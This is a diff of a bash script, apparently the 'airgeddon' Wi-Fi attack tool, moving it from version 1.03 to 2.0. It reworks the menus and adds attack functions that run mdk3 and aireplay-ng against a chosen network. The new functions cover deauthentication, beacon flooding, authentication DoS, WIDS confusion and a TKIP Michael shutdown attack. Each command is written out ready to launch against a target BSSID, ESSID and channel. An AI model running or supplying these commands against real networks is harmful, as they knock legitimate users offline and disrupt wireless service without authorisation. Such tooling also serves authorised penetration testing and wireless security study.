@@ -1,74 +1,55 @@
 #!/bin/bash
 
-version="1.03"
+version="2.0"
+
+trap killing_script INT
 
 function check_to_set_managed() {
 
-	if [ "$distro" = "Kali" ]; then
-	      nowifi=`iwconfig $interface 2> /dev/null`
-	      if [[ "$?" != "0" ]]; then
-		      echo
-		      echo_yellow "This interface $interface is not a wifi card. It doesn't support managed mode"
-		      read -p "Press [Enter] key to continue..."
-		      return 1
-	      fi
-	else
-	      nowifi=`iwconfig $interface 2> /dev/null|grep Mode:`
-	      if [[ "$?" != "0" ]]; then
-	      	      echo
-		      echo_yellow "This interface $interface is not a wifi card. It doesn't support managed mode"
-		      read -p "Press [Enter] key to continue..."
-		      return 1
-	      fi
-	fi
-
-	mode=`iwconfig $interface | grep Mode: | cut -d ':' -f 2|cut -d ' ' -f 1`
-
-	if [[ $mode = "Managed" ]]; then
-	      echo
-	      echo_yellow "This interface $interface is already in managed mode"
-	      read -p "Press [Enter] key to continue..."
-	      return 1
-	fi
+	check_interface_mode
+	case "$ifacemode" in
+		"Managed")
+			echo
+			echo_yellow "This interface $interface is already in managed mode"
+			read -p "Press [Enter] key to continue..."
+			return 1
+		;;
+		"(Non wifi card)")
+			echo
+			echo_yellow "This interface $interface is not a wifi card. It doesn't support managed mode"
+			read -p "Press [Enter] key to continue..."
+			return 1
+		;;
+	esac
 	return 0
+
 }
 
 function check_to_set_monitor() {
 
-	if [ "$distro" = "Kali" ]; then
-	      nowifi=`iwconfig $interface 2> /dev/null`
-	      if [[ "$?" != "0" ]]; then
-		      echo
-		      echo_yellow "This interface $interface is not a wifi card. It doesn't support monitor mode"
-		      read -p "Press [Enter] key to continue..."
-		      return 1
-	      fi
-	else
-	      nowifi=`iwconfig $interface 2> /dev/null|grep Mode:`
-	      if [[ "$?" != "0" ]]; then
-	      	      echo
-		      echo_yellow "This interface $interface is not a wifi card. It doesn't support monitor mode"
-		      read -p "Press [Enter] key to continue..."
-		      return 1
-	      fi
-	fi
-
-	mode=`iwconfig $interface 2> /dev/null | grep Mode: | awk '{print $4}'`
-
-	if [[ $mode = "Mode:Monitor" ]]; then
-	      echo
-	      echo_yellow "This interface $interface is already in monitor mode"
-	      read -p "Press [Enter] key to continue..."
-	      return 1
-	fi
+	check_interface_mode
+	case "$ifacemode" in
+		"Monitor")
+			echo
+			echo_yellow "This interface $interface is already in monitor mode"
+			read -p "Press [Enter] key to continue..."
+			return 1
+		;;
+		"(Non wifi card)")
+			echo
+			echo_yellow "This interface $interface is not a wifi card. It doesn't support monitor mode"
+			read -p "Press [Enter] key to continue..."
+			return 1
+		;;
+	esac
 	return 0
 }
 
 function check_monitor_enabled() {
 
-	mode=`iwconfig $interface 2> /dev/null | grep Mode: | awk '{print $4}'`
+	mode=`iwconfig $interface 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2`
 
-	if [[ $mode != "Mode:Monitor" ]]; then
+	if [[ $mode != "Monitor" ]]; then
 		echo
 		echo_yellow "This interface $interface is not in monitor mode"
 		read -p "Press [Enter] key to continue..."
@@ -107,7 +88,7 @@ function managed_option() {
 
 	if [ "$interface" != "$new_interface" ]; then
 		echo
-		echo_yellow "The interface changed its name while putting in managed mode"
+		echo_yellow "The interface changed its name while putting in managed mode. Autoselected"
 		interface=$new_interface
 	fi
 
@@ -149,13 +130,48 @@ function monitor_option() {
 
 	if [ "$interface" != "$new_interface" ]; then
 		echo
-		echo_yellow "The interface changed its name while putting in monitor mode"
+		echo_yellow "The interface changed its name while putting in monitor mode. Autoselected"
 		interface=$new_interface
 	fi
 
 	echo
 	echo_yellow "Monitor mode now is set on $interface"
 	read -p "Press [Enter] key to continue..."
+}
+
+function check_interface_mode() {
+
+	if [ "$distro" = "Kali" ]; then
+		nowifi=`iwconfig $interface 2> /dev/null`
+		if [[ "$?" != "0" ]]; then
+			ifacemode="(Non wifi card)"
+			return 0
+		fi
+	else
+		nowifi=`iwconfig $interface 2> /dev/null | grep Mode:`
+		if [[ "$?" != "0" ]]; then
+			ifacemode="(Non wifi card)"
+			return 0
+	      fi
+	fi
+
+	modemanaged=`iwconfig $interface 2> /dev/null | grep Mode: | cut -d ':' -f 2 | cut -d ' ' -f 1`
+
+	if [[ $modemanaged = "Managed" ]]; then
+	      ifacemode="Managed"
+	      return 0
+	fi
+
+	modemonitor=`iwconfig $interface 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2`
+
+	if [[ $modemonitor = "Monitor" ]]; then
+	      ifacemode="Monitor"
+	      return 0
+	fi
+
+	echo_yellow "There is a problem with the interface selected. Redirecting you to exit script"
+	read -p "Press [Enter] key to continue..."
+	exit_script_option
 }
 
 function select_interface() {
@@ -200,10 +216,10 @@ function read_channel() {
 function ask_channel() {
 
 	while [[ ! ${channel} =~ ^([1-9]|1[0-4])$ ]]; do
-			read_channel
-		done
-		echo
-		echo_yellow "Channel set to ${channel}"
+		read_channel
+	done
+	echo
+	echo_yellow "Channel set to ${channel}"
 }
 
 function read_bssid() {
@@ -222,10 +238,32 @@ function ask_bssid() {
 	echo_yellow "BSSID set to ${bssid}"
 }
 
+function read_essid() {
+
+	echo
+	echo_green "Type target ESSID :"
+	read essid
+}
+
+function ask_essid() {
+
+	if [ -z "$essid" ]; then
+		read_essid
+		else if [ "$essid" = "(Hidden Network)" ]; then
+			echo
+			echo_yellow "You have selected a hidden network ESSID. Can't use it. Select another one or perform a BSSID based attack instead of this"
+			read_essid
+		fi
+	fi
+
+	echo
+	echo_yellow "ESSID set to ${essid}"
+}
+
 function exec_mdk3deauth() {
 
 	echo
-	echo_red "*********************************Mdk3 action************************************"
+	echo_red "******************************Mdk3 amok action**********************************"
 	echo_green "All parameters set"
 
 	rm /tmp/bl.txt > /dev/null 2>&1
@@ -234,13 +272,13 @@ function exec_mdk3deauth() {
 	echo
 	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
 	read -p "Press [Enter] key to start attack..."
-	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "mdk3 attack" -e mdk3 $interface d -b /tmp/bl.txt -c $channel
+	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "mdk3 amok attack" -e mdk3 $interface d -b /tmp/bl.txt -c $channel
 }
 
 function exec_aireplaydeauth() {
 
 	echo
-	echo_red "*******************************Aireplay action**********************************"
+	echo_red "***************************Aireplay deauth action*******************************"
 	echo_green "All parameters set"
 
 	airmon-ng start $interface $channel > /dev/null 2>&1
@@ -248,13 +286,61 @@ function exec_aireplaydeauth() {
 	echo
 	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
 	read -p "Press [Enter] key to start attack..."
-	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "aireplay attack" -e aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $interface
+	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $interface
+}
+
+function exec_wdsconfusion() {
+
+	echo
+	echo_red "*********************WIDS / WIPS / WDS confusion action*************************"
+	echo_green "All parameters set"
+
+	echo
+	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
+	read -p "Press [Enter] key to start attack..."
+	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "wids / wips / wds confusion attack" -e mdk3 $interface w -e $essid -c $channel
+}
+
+function exec_beaconflood() {
+
+	echo
+	echo_red "****************************Beacon flood action*********************************"
+	echo_green "All parameters set"
+
+	echo
+	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
+	read -p "Press [Enter] key to start attack..."
+	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "beacon flood attack" -e mdk3 $interface b -n $essid -c $channel -s 1000 -h
+}
+
+function exec_authdos() {
+
+	echo
+	echo_red "******************************Auth DoS action***********************************"
+	echo_green "All parameters set"
+
+	echo
+	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
+	read -p "Press [Enter] key to start attack..."
+	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "auth dos attack" -e mdk3 $interface a -a $bssid -m -s 1024
+}
+
+function exec_michaelshutdown() {
+
+	echo
+	echo_red "**************************Michael Shutdown action*******************************"
+	echo_green "All parameters set"
+
+	echo
+	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
+	read -p "Press [Enter] key to start attack..."
+	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "michael shutdown attack" -e mdk3 $interface m -t $bssid -w 1 -n 1024 -s 1024
 }
 
 function mdk3_deauth_option() {
 
 	echo
-	echo_red "*******************************Mdk3 parameters**********************************"
+	echo_red "****************************Mdk3 amok parameters********************************"
 	echo_green "Deauthentication / Dissasociation mdk3 attack chosen (monitor mode needed)"
 
 	check_monitor_enabled
@@ -273,7 +359,7 @@ function mdk3_deauth_option() {
 function aireplay_deauth_option() {
 
 	echo
-	echo_red "*****************************Aireplay parameters********************************"
+	echo_red "*************************Aireplay deauth parameters*****************************"
 	echo_green "Deauthentication aireplay attack chosen (monitor mode needed)"
 
 	check_monitor_enabled
@@ -289,9 +375,93 @@ function aireplay_deauth_option() {
 	exec_aireplaydeauth
 }
 
+function wds_confusion_option() {
+
+	echo
+	echo_red "************************WIDS / WIPS / WDS parameters****************************"
+	echo_green "WIDS / WIPS / WDS confusion attack chosen (monitor mode needed)"
+
+	check_monitor_enabled
+	if [ "$?" != "0" ]; then
+		return
+	fi
+
+	echo
+	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+
+	ask_essid
+	ask_channel
+	exec_wdsconfusion
+}
+
+function beacon_flood_option() {
+
+	echo
+	echo_red "***************************Beacon flood parameters******************************"
+	echo_green "Beacon flood attack chosen (monitor mode needed)"
+
+	check_monitor_enabled
+	if [ "$?" != "0" ]; then
+		return
+	fi
+
+	echo
+	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+
+	ask_essid
+	ask_channel
+	exec_beaconflood
+}
+
+function auth_dos_option() {
+
+	echo
+	echo_red "*****************************Auth DoS parameters********************************"
+	echo_green "Auth DoS attack chosen (monitor mode needed)"
+
+	check_monitor_enabled
+	if [ "$?" != "0" ]; then
+		return
+	fi
+
+	echo
+	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+
+	ask_bssid
+	exec_authdos
+}
+
+function michael_shutdown_option() {
+
+	echo
+	echo_red "************************Michael Shutdown parameters*****************************"
+	echo_green "Michael Shutdown (TKIP) attack chosen (monitor mode needed)"
+
+	check_monitor_enabled
+	if [ "$?" != "0" ]; then
+		return
+	fi
+
+	echo
+	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"
+
+	ask_bssid
+	exec_michaelshutdown
+}
+
 function print_selections() {
 
-	echo_blue "Interface $interface selected"
+	if [ -z "$interface" ]; then
+		echo_blue "No interface selected. You'll be redirected to select one"
+		echo
+		read -p "Press [Enter] key to continue..."
+		select_interface
+		menu_options
+	else
+		check_interface_mode
+		echo_blue "Interface $interface selected. Mode: $ifacemode"
+	fi
+
 	if [ -n "$bssid" ]; then
 		echo_blue "Selected BSSID: $bssid"
 		if [ -n "$channel" ]; then
@@ -312,62 +482,127 @@ function menu_options() {
 
 	clear
 	echo_red "*****************************airgeddon script menu********************************"
+	current_menu="main"
 	print_selections
 	echo
 	echo_green "Select your option from menu :"
-    echo "---------"
+    echo_blue "---------"
 	echo "1. Select another network interface"
 	echo "2. Explore neighbourhood (info window) for targets (monitor mode needed)"
-	echo "---------"
-    echo "3. Deauthentication / Disassociation mdk3 attack (monitor mode needed)"
-    echo "4. Deauthentication aireplay attack (monitor mode needed)"
-	echo "---------"
-	echo "5. Put interface in monitor mode"
-	echo "6. Put interface in managed mode"
-	echo "---------"
-	echo "7. Credits & About"
-    echo "8. Exit script"
+	echo_blue "---------(monitor mode needed for attacks)---------"
+    echo "3. Deauth / disassoc amok mdk3 attack"
+    echo "4. Deauth aireplay attack"
+	echo "5. WIDS / WIPS / WDS confusion attack"
+	echo_blue "---------"
+	echo "6. Old \"obsolete/non very effective\" attacks menu"
+	echo_blue "---------"
+	echo "7. Put interface in monitor mode"
+	echo "8. Put interface in managed mode"
+	echo_blue "---------"
+	echo "9. Credits & about"
+    echo "10. Exit script"
 	read option
 
-	if [ -z $option ]; then
-		invalid_menu_option
-
-		else if [ $option -eq 1 ]; then
+	case $option in
+		1)
 			select_interface
-
-			else if [ $option -eq 2 ]; then
-
-				explore_neighbourhood_option
-				else if [ $option -eq 3 ]; then
-					mdk3_deauth_option
-
-					else if [ $option -eq 4 ]; then
-					aireplay_deauth_option
-
-						else if [ $option -eq 5 ]; then
-							monitor_option
-
-							else if [ $option -eq 6 ]; then
-								managed_option
-
-								else if [ $option -eq 7 ]; then
-									credits_option
-
-									else if [ $option -eq 8 ]; then
-										exit_script_option
-									else
-										invalid_menu_option
-									fi
-								fi
-							fi
-						fi
-					fi
-				fi
-			fi
-		fi
-	fi
+		;;
+		2)
+			explore_neighbourhood_option
+		;;
+		3)
+			mdk3_deauth_option
+		;;
+		4)
+			aireplay_deauth_option
+		;;
+		5)
+			wds_confusion_option
+		;;
+		6)
+			old_attacks_menu
+		;;
+		7)
+			monitor_option
+		;;
+		8)
+			managed_option
+		;;
+		9)
+			credits_option
+		;;
+		10)
+			exit_script_option
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
 
 	menu_options
+}
+
+function old_attacks_menu() {
+
+	clear
+	echo_red "*******************************Old attacks menu*********************************"
+	current_menu="old"
+	print_selections
+	echo
+	echo_green "Select your option from menu :"
+	echo_blue "---------"
+	echo "1. Select another network interface"
+	echo "2. Explore neighbourhood (info window) for targets (monitor mode needed)"
+    echo_blue "---------(monitor mode needed for attacks)---------"
+	echo "3. Beacon flood attack"
+	echo "4. Auth DoS attack"
+	echo "5. Michael shutdown exploitation (TKIP) attack"
+	echo_blue "---------"
+	echo "6. Put interface in monitor mode"
+	echo "7. Put interface in managed mode"
+	echo_blue "---------"
+	echo "8. Return to main menu"
+	echo "9. Credits & about"
+        echo "10. Exit script"
+
+	read oldoption
+
+	case $oldoption in
+		1)
+			select_interface
+		;;
+		2)
+			explore_neighbourhood_option
+		;;
+		3)
+			beacon_flood_option
+		;;
+		4)
+			auth_dos_option
+		;;
+		5)
+			michael_shutdown_option
+		;;
+		6)
+			monitor_option
+		;;
+		7)
+			managed_option
+		;;
+		8)
+			return
+		;;
+		9)
+			credits_option
+		;;
+		10)
+			exit_script_option
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+	old_attacks_menu
 }
 
 function explore_neighbourhood_option() {
@@ -395,7 +630,7 @@ function explore_neighbourhood_option() {
 
 	head -n $targetline /tmp/nws-01.csv &> /tmp/nws.csv
 	tail -n +$targetline /tmp/nws-01.csv &> /tmp/clts.csv
-	#clear
+
 	csvline=`wc -l /tmp/nws.csv | awk '{print $1}'`
 	if [ $csvline -le 3 ]; then
 		echo
@@ -514,7 +749,7 @@ function select_target() {
 function credits_option() {
 
 	clear
-	echo_red "******************************Credits & About***********************************"
+	echo_red "******************************Credits & about***********************************"
 	echo_blue "airgeddon script v$version developed by :"
 	echo "       ____        ____  __   _______"
 	echo "___  _/_   | _____/_   |/  |_ \   _  \_______"
@@ -555,6 +790,21 @@ function invalid_iface_selected() {
 	select_interface
 }
 
+function killing_script() {
+
+	echo
+	echo
+	echo_yellow "Please, exit properly using menu option"
+	echo
+	read -p "Press [Enter] key to continue..."
+
+	if [ "$current_menu" = "main" ]; then
+		menu_options
+	else
+		old_attacks_menu
+	fi
+}
+
 function exit_script_option() {
 
 	echo
@@ -589,6 +839,7 @@ function detect_distro() {
 function welcome() {
 
 	clear
+	current_menu="main"
 	echo_red "***********************************Welcome**************************************"
 	echo_blue "Welcome to airgeddon script"
 	echo
@@ -597,9 +848,9 @@ function welcome() {
 	echo_blue "This script is only working on Kali Linux and Wifislax"
 	echo_blue "Detecting distro..."
 	echo
-
 	detect_distro
 	read -p "Press [Enter] key to continue..."
+
 	select_interface
 	menu_options
 }
@@ -626,6 +877,7 @@ function echo_yellow() {
 }
 
 function echo_red() {
+
 	tput setaf 1; tput setab 0;
 	echo $*
 	tput sgr0
